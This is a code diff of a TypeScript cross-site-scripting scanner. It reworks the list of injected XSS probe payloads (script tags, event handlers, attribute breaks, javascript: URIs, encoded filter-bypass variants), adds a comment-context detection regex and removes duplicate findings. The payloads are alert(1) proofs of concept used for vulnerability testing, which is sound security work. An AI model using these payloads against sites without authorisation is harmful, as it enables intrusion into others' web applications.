@@ -19,55 +19,26 @@ export interface XSSScanResult {
 }
 
 const XSS_PAYLOADS = [
-  // original entries
-  { payload: '<script>alert(1)</script>', type: 'Script Tag', severity: 'critical' as const, confidence: 0.95 },
-  { payload: '<img src=x onerror=alert(1)>', type: 'Event Handler', severity: 'critical' as const, confidence: 0.95 },
-  { payload: '<svg onload=alert(1)>', type: 'SVG Event', severity: 'critical' as const, confidence: 0.95 },
-  { payload: '"><script>alert(1)</script>', type: 'Attribute Break', severity: 'critical' as const, confidence: 0.9 },
-  { payload: '\'><script>alert(1)</script>', type: 'Attribute Break', severity: 'critical' as const, confidence: 0.9 },
-  { payload: 'javascript:alert(1)', type: 'JavaScript Protocol', severity: 'high' as const, confidence: 0.85 },
-  { payload: '<iframe src="javascript:alert(1)">', type: 'Iframe Injection', severity: 'critical' as const, confidence: 0.9 },
+  // --- Critical Execution Payloads ---
+  { payload: '<script>alert(1)</script>', type: 'Script Tag', severity: 'critical' as const, confidence: 0.98 },
+  { payload: '<img src=x onerror=alert(1)>', type: 'Event Handler (Img)', severity: 'critical' as const, confidence: 0.98 },
+  { payload: '<svg onload=alert(1)>', type: 'SVG Event', severity: 'critical' as const, confidence: 0.98 },
+  { payload: '"><script>alert(1)</script>', type: 'Attribute Break (Double Quote)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '\'><script>alert(1)</script>', type: 'Attribute Break (Single Quote)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<iframe src="javascript:alert(1)">', type: 'Iframe Injection', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<input autofocus onfocus=alert(1)>', type: 'Autofocus/Onfocus', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<body onload=alert(1)>', type: 'Body Onload', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '";alert(1);//', type: 'JS Context Break (DOM)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: "';alert(1);//", type: 'JS Context Break (DOM)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', type: 'Iframe srcdoc', severity: 'critical' as const, confidence: 0.95 },
 
-  // additional/reflected payloads
-  { payload: '<body onload=alert(1)>', type: 'Body Onload', severity: 'critical' as const, confidence: 0.92 },
-  { payload: '<details open ontoggle=alert(1)>', type: 'HTML5 Details Toggle', severity: 'high' as const, confidence: 0.88 },
-  { payload: '<input autofocus onfocus=alert(1)>', type: 'Autofocus/Onfocus', severity: 'critical' as const, confidence: 0.9 },
-  { payload: '<a href="javascript:alert(1)">click</a>', type: 'Link JS Protocol', severity: 'high' as const, confidence: 0.85 },
-
-  // attribute-break / quoted-attribute polyglots
-  { payload: '"><img src=x onerror=alert(1)>', type: 'Attribute Break + Img', severity: 'critical' as const, confidence: 0.93 },
-  { payload: "'><img src=x onerror=alert(1)>", type: 'Attribute Break + Img', severity: 'critical' as const, confidence: 0.93 },
-
-  // svg / foreignObject / namespace tricks
-  { payload: '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>', type: 'SVG foreignObject', severity: 'critical' as const, confidence: 0.92 },
-  { payload: '<svg onload=alert(1)//', type: 'SVG onload short', severity: 'critical' as const, confidence: 0.9 },
-
-  // DOM / JS sink variants (useful for DOM XSS)
-  { payload: '";alert(1);//', type: 'JS Context Break (DOM)', severity: 'critical' as const, confidence: 0.9 },
-  { payload: "';alert(1);//", type: 'JS Context Break (DOM)', severity: 'critical' as const, confidence: 0.9 },
-
-  // protocol/data URIs and meta refresh
-  { payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', type: 'Meta Refresh', severity: 'high' as const, confidence: 0.82 },
-  { payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', type: 'Iframe srcdoc', severity: 'critical' as const, confidence: 0.9 },
-  { payload: '<a href="data:text/html,<script>alert(1)</script>">x</a>', type: 'Data URI', severity: 'high' as const, confidence: 0.8 },
-
-  // encoded / obfuscated variants (useful to bypass naive filters)
-  { payload: '%3Cscript%3Ealert(1)%3C%2Fscript%3E', type: 'URL-encoded Script', severity: 'high' as const, confidence: 0.78 },
-  { payload: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', type: 'HTML Entity Encoded', severity: 'high' as const, confidence: 0.78 },
-
-  // event-handler attribute polyglots & less-common events
-  { payload: '<video onerror=alert(1)><source src=1></video>', type: 'Media Onerror', severity: 'high' as const, confidence: 0.86 },
-  { payload: '<math><maction xlink:href="javascript:alert(1)"></maction></math>', type: 'MathML / XLink', severity: 'medium' as const, confidence: 0.6 },
-
-  // template / attribute injection useful for modern frameworks
-  { payload: '\' + alert(1) + \\' , type: 'JS Template/Concat (Framework)', severity: 'critical' as const, confidence: 0.88 },
-  { payload: '${alert(1)}', type: 'Template Literal Injection', severity: 'critical' as const, confidence: 0.88 },
-
-  // browser URL / location sinks (useful in script contexts)
-  { payload: '");location.href="javascript:alert(1)//', type: 'location.href Break', severity: 'critical' as const, confidence: 0.9 },
-
-  // harmless proof-of-concept alternatives (useful for low-risk testing)
-  { payload: '<svg><desc>TEST</desc></svg>', type: 'SVG Non-Exec (PoC)', severity: 'low' as const, confidence: 0.3 },
+  // --- High Evasion/Protocol Payloads ---
+  { payload: 'javascript:alert(1)', type: 'JavaScript Protocol', severity: 'high' as const, confidence: 0.9 },
+  { payload: '<a href="javascript:alert(1)">click</a>', type: 'Link JS Protocol', severity: 'high' as const, confidence: 0.9 },
+  { payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', type: 'Meta Refresh', severity: 'high' as const, confidence: 0.85 },
+  { payload: '<video onerror=alert(1)><source src=1></video>', type: 'Media Onerror', severity: 'high' as const, confidence: 0.85 },
+  { payload: '%3Cscript%3Ealert(1)%3C%2Fscript%3E', type: 'URL-encoded Script', severity: 'medium' as const, confidence: 0.75 },
+  { payload: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', type: 'HTML Entity Encoded', severity: 'medium' as const, confidence: 0.75 },
 ];
 
 const XSS_DANGEROUS_CONTEXTS = [
@@ -81,6 +52,8 @@ const XSS_DANGEROUS_CONTEXTS = [
   /(href|src)\s*=\s*["']?(?:javascript|data):[^"']*?PAYLOAD/i,
   // Directly in HTML body where it can create new tags
   />[^<]*?PAYLOAD[^<]*?</i, // Matches payload between tags
+  // Inside a comment that is improperly closed
+  /<!--[\s\S]*?PAYLOAD[\s\S]*?-->/i,
 ];
 
 const checkReflection = (response: string, payload: string): { 
@@ -93,7 +66,7 @@ const checkReflection = (response: string, payload: string): {
   const lowerResponse = response.toLowerCase();
   const lowerPayload = payload.toLowerCase();
   
-  // Check for direct reflection (unencoded)
+  // 1. Check for direct reflection (unencoded)
   if (lowerResponse.includes(lowerPayload)) {
     const index = lowerResponse.indexOf(lowerPayload);
     const contextSnippet = response.substring(Math.max(0, index - 150), Math.min(response.length, index + payload.length + 150));
@@ -123,7 +96,7 @@ const checkReflection = (response: string, payload: string): {
     };
   }
 
-  // Check for HTML encoded reflection (safe)
+  // 2. Check for HTML encoded reflection (safe)
   const htmlEncodedPayload = payload
     .replace(/&/g, '&amp;') // Must be first
     .replace(/</g, '&lt;')
@@ -141,7 +114,7 @@ const checkReflection = (response: string, payload: string): {
     };
   }
 
-  // Check for URL encoded reflection (safe)
+  // 3. Check for URL encoded reflection (safe)
   const urlEncodedPayload = encodeURIComponent(payload);
   if (response.includes(urlEncodedPayload)) {
     return {
@@ -215,16 +188,22 @@ export const performXSSScan = async (target: string, requestManager: RequestMana
 
           if (reflection.reflected && !reflection.encoded && reflection.confidence >= 0.7) { // Only consider high confidence unencoded reflections
             console.log(`[XSS Scan] ⚠️ ${severity.toUpperCase()}: XSS vulnerability detected! Confidence: ${(reflection.confidence * 100).toFixed(0)}%`);
-            result.vulnerable = true;
-            result.vulnerabilities.push({
-              payload,
-              location: `URL parameter: ${paramKey}`,
-              severity,
-              type,
-              evidence: reflection.evidence,
-              parameter: paramKey,
-              confidence: reflection.confidence,
-            });
+            
+            // Check if this specific vulnerability (payload + parameter) has already been recorded
+            const isDuplicate = result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload);
+
+            if (!isDuplicate) {
+              result.vulnerable = true;
+              result.vulnerabilities.push({
+                payload,
+                location: `URL parameter: ${paramKey}`,
+                severity,
+                type,
+                evidence: reflection.evidence,
+                parameter: paramKey,
+                confidence: reflection.confidence,
+              });
+            }
           } else if (reflection.reflected && reflection.encoded) {
             console.log(`[XSS Scan] ℹ️ Payload reflected but safely encoded: ${paramKey}`);
           }
